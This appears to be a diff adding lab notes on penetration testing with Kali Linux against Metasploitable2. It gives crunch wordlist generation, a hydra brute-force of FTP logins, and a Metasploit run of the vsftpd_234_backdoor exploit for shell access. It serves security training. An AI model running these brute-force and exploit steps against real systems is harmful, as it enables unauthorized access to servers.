@@ -1,0 +1,37 @@
+crunch command to generate password file
+===============================================================
+crunch 3 5 abc123 -o pass.txt
+
+
+Retrieve the IP address for you system
+================================================================
+ifconfig
+
+
+Know the IP address for any server
+=================================================================
+host <<server>>
+host <example.com>>
+
+
+The following commands requires Kali Linux and Metasploitable2 
+Penetrate ftp using hydra
+==================================================================
+hydra -l msfadmin -P /root/ss/pass.txt -vV 192.168.56.101 ftp
+ftp <<ip address>>
+pwd
+
+
+Penetrate ftp using hydra using msfconsole
+==================================================================
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOST <<ip address>>
+show options
+run
+pwd
+ls -la
+cd home
+ls
